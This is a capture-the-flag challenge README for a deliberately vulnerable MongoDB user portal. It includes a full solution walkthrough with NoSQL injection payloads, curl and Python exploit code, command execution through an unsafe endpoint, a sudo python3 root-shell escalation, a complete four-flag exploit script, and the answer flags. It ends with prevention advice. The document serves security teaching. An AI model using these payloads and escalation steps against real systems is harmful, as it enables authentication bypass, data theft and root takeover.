# NoSQL Injection Challenge

**Status:** ✅ Complete

## Player Description

Welcome to EverSec's Modern User Portal powered by MongoDB! We switched to NoSQL because our CTO read that SQL injection is a problem, and NoSQL has "No" right in the name, so obviously No SQL = No SQL Injection! We're basically geniuses. Our authentication system directly passes your input to MongoDB because the database is smart enough to figure out what you mean. We thought about "sanitizing inputs" but that sounded like something from a hospital, not a tech company. Plus, MongoDB uses JSON and everyone knows JSON is safe because it's just data, not code! Right? ...Right?

## Technical Description

**Category:** Web / NoSQL Injection
**Difficulty:** Medium
**Points:** 1,800 (4 flags)

A MongoDB-based user authentication system vulnerable to NoSQL injection attacks. This challenge demonstrates how improper handling of user input in NoSQL queries can lead to authentication bypass, data extraction, remote code execution, and privilege escalation.

## Challenge Information

- **Port:** 4007
- **URL:** http://localhost:4007

## Objectives

This challenge demonstrates progression from NoSQL injection to complete system compromise:

1. **FLAG 1 (200 pts)**: Bypass authentication to login as administrator
2. **FLAG 2 (450 pts)**: Extract sensitive data from the database (admin's secret field)
3. **FLAG 3 (550 pts)**: Achieve Remote Code Execution via command execution endpoint
4. **FLAG 4 (600 pts)**: Escalate privileges to root using sudo misconfiguration

## Background: What is NoSQL Injection?

NoSQL injection is similar to SQL injection but targets NoSQL databases like MongoDB, CouchDB, or Redis. Unlike SQL databases that use structured query language, NoSQL databases often use JSON-like query objects. When applications directly pass user input into these query objects without sanitization, attackers can inject MongoDB operators to manipulate queries.

Common MongoDB operators:
- `$ne` - not equal
- `$gt` / `$lt` - greater than / less than
- `$regex` - regular expression matching
- `$where` - JavaScript expression evaluation

## The Vulnerability

### 1. Authentication Bypass (app.py:96-102)

```python
# VULNERABLE: Direct use of user input in MongoDB query
user = db.users.find_one({'username': username, 'password': password})
```

The application accepts JSON input and directly uses it in the MongoDB query without sanitization. An attacker can inject MongoDB operators:

```json
{
  "username": "admin",
  "password": {"$ne": null}
}
```

This makes the query: "Find user where username is 'admin' AND password is not null" - which bypasses authentication!

### 2. Data Extraction (app.py:154-163)

```python
# VULNERABLE: Direct use of user input in MongoDB query
search_query = data.get('username', '')
query = {'username': search_query}
users = list(db.users.find(query, {'password': 0}))
```

The search endpoint accepts any MongoDB query operators, allowing extraction of all user data:

```json
{
  "username": {"$regex": ".*"}
}
```

This returns all users in the database, including the admin's secret field containing FLAG 2.

### 3. Command Execution Endpoint (app.py:180-195)

```python
@app.route('/api/execute', methods=['POST'])
def execute_command():
    # VULNERABLE: Direct command execution
    command = data.get('command', '')
    result = subprocess.check_output(command, shell=True, text=True)
    return jsonify({'success': True, 'output': result})
```

The application includes an endpoint that executes arbitrary system commands without validation. Once authenticated (via NoSQL injection), this provides direct RCE.

### 4. Sudo Misconfiguration for Privilege Escalation

```dockerfile
# In Dockerfile:
RUN echo "ctfuser ALL=(ALL) NOPASSWD: /usr/bin/python3" > /etc/sudoers.d/ctfuser
```

The ctfuser can run python3 as root without a password, enabling privilege escalation via GTFOBins.

## Setup

### Using Docker Compose (Recommended)

From the project root directory:

```bash
docker compose up -d nosql-injection
```

The challenge will be available at http://localhost:4007

### Using Docker Directly

```bash
docker build -t nosql-injection .
docker run -p 4007:4007 \
  -e FLAG1="FLAG{n0sql_4uth_byp4ss}" \
  -e FLAG2="FLAG{n0sql_d4t4_dump3d}" \
  nosql-injection
```

### Local Development

Requires MongoDB running on localhost:27017

```bash
pip install -r requirements.txt
export FLAG1="FLAG{n0sql_4uth_byp4ss}"
export FLAG2="FLAG{n0sql_d4t4_dump3d}"
python app.py
```

## Solution

<details>
<summary>Click to reveal solution</summary>

### Phase 1: FLAG 1 - Authentication Bypass

#### Step 1: Understand the Login Mechanism

Navigate to http://localhost:4007/login and examine the login form. Open browser DevTools and look at the network request when logging in.

The login expects JSON:
```json
{
  "username": "test",
  "password": "test123"
}
```

#### Step 2: Inject MongoDB Operator

Instead of providing a string password, inject a MongoDB operator to bypass authentication:

```bash
curl -X POST http://localhost:4007/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": {"$ne": null}
  }'
```

Or using Python:

```python
import requests

BASE_URL = "http://localhost:4007"

# Inject $ne (not equal) operator
payload = {
    "username": "admin",
    "password": {"$ne": None}  # Matches any password that exists
}

response = requests.post(f"{BASE_URL}/login", json=payload)
result = response.json()

if result.get('success'):
    print(f"🚩 FLAG 1: {result.get('flag')}")
```

The query becomes: `db.users.find_one({'username': 'admin', 'password': {'$ne': null}})` which finds the admin user regardless of password.

**Alternative payloads:**

```json
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$exists": true}}
{"username": {"$regex": "^admin$"}, "password": {"$ne": null}}
```

#### Step 3: Access Dashboard

After successful authentication bypass, you'll receive FLAG 1 in the response. You can also access the dashboard at http://localhost:4007/dashboard

### Phase 2: FLAG 2 - Data Extraction

#### Step 4: Login First

You need to be authenticated to access the search endpoint. Use the authentication bypass from Phase 1:

```python
import requests

BASE_URL = "http://localhost:4007"
session = requests.Session()

# Login as admin
payload = {
    "username": "admin",
    "password": {"$ne": None}
}

response = session.post(f"{BASE_URL}/login", json=payload)
print("[+] Logged in as admin")
```

#### Step 5: Enumerate All Users

The `/api/search` endpoint is vulnerable to NoSQL injection. Extract all users:

```bash
curl -X POST http://localhost:4007/api/search \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d '{
    "username": {"$regex": ".*"}
  }'
```

Or using Python:

```python
# Search with regex to match all users
search_payload = {
    "username": {"$regex": ".*"}
}

response = session.post(f"{BASE_URL}/api/search", json=search_payload)
result = response.json()

print(f"[+] Found {result['count']} users:")
for user in result['users']:
    print(f"  - {user['username']} ({user.get('role', 'N/A')})")
    if 'secret' in user:
        print(f"    SECRET: {user['secret']}")
        print(f"    🚩 FLAG 2: {user['secret']}")
```

The admin user document contains a `secret` field with FLAG 2!

#### Step 6: Alternative Extraction Methods

**Extract specific user:**
```json
{"username": {"$regex": "^admin$"}}
```

**Extract by role:**
```json
{"username": {"$gt": ""}, "role": "administrator"}
```

**Boolean-based blind extraction** (if output was limited):
```python
# Extract username character by character
for i in range(10):
    for char in 'abcdefghijklmnopqrstuvwxyz':
        payload = {
            "username": {"$regex": f"^{char}"}
        }
        response = session.post(f"{BASE_URL}/api/search", json=payload)
        if response.json()['count'] > 0:
            print(f"First char: {char}")
            break
```

### Phase 3: FLAG 3 - Remote Code Execution

Now that we're authenticated as admin, we can access the command execution endpoint.

#### Step 7: Discover Command Execution Endpoint

```bash
curl -X POST http://localhost:4007/api/execute \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d '{
    "command": "whoami"
  }'
```

#### Step 8: Read FLAG 3

```python
# Execute command to read FLAG 3
exec_payload = {
    "command": "cat /home/ctfuser/flag3.txt"
}

response = session.post(f"{BASE_URL}/api/execute", json=exec_payload)
result = response.json()

if result.get('success'):
    print(f"🚩 FLAG 3: {result['output'].strip()}")
```

**FLAG 3**: `n0sql_js_3x3cut10n`

### Phase 4: FLAG 4 - Privilege Escalation to Root

#### Step 9: Check Sudo Privileges

```python
# Check what sudo commands are available
sudo_check = {
    "command": "sudo -l"
}

response = session.post(f"{BASE_URL}/api/execute", json=sudo_check)
print(response.json()['output'])
```

Output shows:
```
User ctfuser may run the following commands:
    (ALL) NOPASSWD: /usr/bin/python3
```

#### Step 10: Exploit Sudo via GTFOBins

Python3 is a known GTFOBin. We can use it to escalate to root:

**Note**: The sudoers rule points to `/usr/bin/python3`, which resolves via symlink to the actual Python binary. This works correctly — `sudo /usr/bin/python3` is the correct command to use.

```python
# Method 1: Direct command execution as root
privesc_payload = {
    "command": "sudo python3 -c 'import os; os.system(\"cat /root/flag4.txt\")'"
}

response = session.post(f"{BASE_URL}/api/execute", json=privesc_payload)
result = response.json()

if result.get('success'):
    print(f"🚩 FLAG 4: {result['output'].strip()}")
```

**Alternative methods**:

```bash
# Method 2: Spawn root shell then read flag
sudo python3 -c 'import pty; pty.spawn("/bin/sh")'
cat /root/flag4.txt

# Method 3: Use python to directly read file
sudo python3 -c 'print(open("/root/flag4.txt").read())'
```

**FLAG 4**: `m0ng0_pr1v_3sc_r00t`

### Complete Exploit Script (All 4 Flags)

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:4007"

print("=" * 60)
print("India - NoSQL Injection Complete Exploit")
print("=" * 60)

# Phase 1: Authentication Bypass
print("\n[Phase 1] Authentication Bypass")
print("-" * 60)

session = requests.Session()

auth_payload = {
    "username": "admin",
    "password": {"$ne": None}
}

response = session.post(f"{BASE_URL}/login", json=auth_payload)
result = response.json()

if result.get('success'):
    print("[+] Successfully bypassed authentication!")
    print(f"[+] Role: {result.get('role')}")
    if result.get('flag'):
        print(f"🚩 FLAG 1: {result['flag']}")

# Phase 2: Data Extraction
print("\n[Phase 2] Data Extraction")
print("-" * 60)

search_payload = {
    "username": {"$regex": ".*"}
}

response = session.post(f"{BASE_URL}/api/search", json=search_payload)
result = response.json()

print(f"[+] Extracted {result['count']} users:")

for user in result['users']:
    print(f"\n  Username: {user.get('username')}")
    print(f"  Email: {user.get('email')}")
    print(f"  Role: {user.get('role')}")
    print(f"  Department: {user.get('department')}")

    if 'secret' in user:
        print(f"  🎯 SECRET FOUND: {user['secret']}")
        print(f"  🚩 FLAG 2: {user['secret']}")

# Phase 3: Command Execution (RCE)
print("\n[Phase 3] Remote Code Execution")
print("-" * 60)

rce_payload = {
    "command": "cat /home/ctfuser/flag3.txt"
}

response = session.post(f"{BASE_URL}/api/execute", json=rce_payload)
result = response.json()

if result.get('success'):
    flag3 = result['output'].strip()
    print(f"[+] Executed command successfully")
    print(f"🚩 FLAG 3: {flag3}")

# Phase 4: Privilege Escalation
print("\n[Phase 4] Privilege Escalation to Root")
print("-" * 60)

# Check sudo privileges
sudo_check = {
    "command": "sudo -l"
}
response = session.post(f"{BASE_URL}/api/execute", json=sudo_check)
print(f"[+] Sudo privileges:\n{response.json()['output']}")

# Escalate to root and read flag
privesc_payload = {
    "command": "sudo python3 -c 'import os; os.system(\"cat /root/flag4.txt\")'"
}

response = session.post(f"{BASE_URL}/api/execute", json=privesc_payload)
result = response.json()

if result.get('success'):
    flag4 = result['output'].strip()
    print(f"[+] Privilege escalation successful")
    print(f"🚩 FLAG 4: {flag4}")

print("\n" + "=" * 60)
print("✓ All 4 flags captured!")
print("=" * 60)
```

</details>

## Learning Objectives

After completing this challenge, you should understand:

1. **NoSQL Injection Basics**: How NoSQL injection differs from SQL injection
2. **MongoDB Operators**: Common operators like $ne, $regex, $gt, and their uses
3. **Authentication Bypass**: Exploiting loose type checking in NoSQL queries
4. **Data Extraction**: Using regex and operators to dump database contents
5. **JSON-based Attacks**: Manipulating JSON objects to inject malicious queries
6. **Remote Code Execution**: Exploiting command execution endpoints after authentication bypass
7. **Privilege Escalation**: Using sudo misconfigurations (GTFOBins) to gain root access
8. **Attack Chaining**: Combining multiple vulnerabilities for complete system compromise
9. **Defense Strategies**: Proper input validation for NoSQL databases and secure sudo configuration

## Common Pitfalls

1. **Wrong Content-Type**: Always use `Content-Type: application/json`
2. **Quotes in JSON**: MongoDB operators need to be JSON objects, not strings
3. **Session required**: The search and execute endpoints require authentication
4. **Case sensitivity**: MongoDB queries are case-sensitive by default
5. **Regex syntax**: Use MongoDB regex syntax, not Python/JavaScript
6. **Command escaping**: When chaining sudo commands, properly escape quotes
7. **TTY issues**: Some sudo commands may require `-c` flag for non-interactive execution

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

The login endpoint sends JSON to a MongoDB backend. MongoDB queries are themselves JSON — and MongoDB supports operators like `$ne` (not equal) embedded directly in query objects. What would happen if your password value was a MongoDB operator object instead of a plain string?

</details>

<details>
<summary>Hint 2</summary>

You're authenticated as admin. Real applications often have API endpoints only visible to privileged users. Are there routes that don't appear in the normal interface?

</details>

<details>
<summary>Hint 3</summary>

Admin-only APIs in vulnerable applications sometimes expose capabilities that would be dangerous externally. What powerful operations might an admin API expose that a regular user can't access?

</details>

<details>
<summary>Hint 4</summary>

You have a shell on the server. What does a pentester typically check first when landing as a low-privileged user on a Linux box looking for a path to root?

</details>

## Prevention

### Input Validation and Sanitization

```python
# SECURE: Validate input types and sanitize
def sanitize_input(data):
    """Ensure input is a string, not an object"""
    if isinstance(data, dict):
        raise ValueError("Invalid input type")
    return str(data)

# Safe query
username = sanitize_input(user_input['username'])
password = sanitize_input(user_input['password'])
user = db.users.find_one({'username': username, 'password': password})
```

### Use ORM/ODM with Parameterization

```python
# SECURE: Use MongoEngine ODM
from mongoengine import Document, StringField, connect

class User(Document):
    username = StringField(required=True)
    password = StringField(required=True)
    role = StringField(default='user')

# Safe query - MongoEngine handles sanitization
user = User.objects(username=username, password=password).first()
```

### Type Casting

```python
# SECURE: Explicitly cast to expected type
username = str(request.json.get('username', ''))
password = str(request.json.get('password', ''))

# This prevents injection of objects like {"$ne": null}
user = db.users.find_one({'username': username, 'password': password})
```

### Schema Validation

```python
# SECURE: Use JSON schema validation
from jsonschema import validate

login_schema = {
    "type": "object",
    "properties": {
        "username": {"type": "string"},
        "password": {"type": "string"}
    },
    "required": ["username", "password"],
    "additionalProperties": False
}

# Validate before processing
try:
    validate(instance=request.json, schema=login_schema)
except:
    return jsonify({'error': 'Invalid input'}), 400
```

### General Best Practices

1. **Always validate input types** - ensure strings are strings, not objects
2. **Use allowlists** for accepted query operators
3. **Implement proper authentication** with secure session management
4. **Use ODM/ORM frameworks** that handle sanitization
5. **Limit query capabilities** - don't expose full query language to users
6. **Monitor for suspicious queries** - log attempts to inject operators
7. **Apply principle of least privilege** to database access

## References

- [OWASP NoSQL Injection](https://owasp.org/www-community/attacks/NoSQL_injection)
- [MongoDB Security Checklist](https://docs.mongodb.com/manual/administration/security-checklist/)
- [NoSQL Injection PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [HackTricks NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
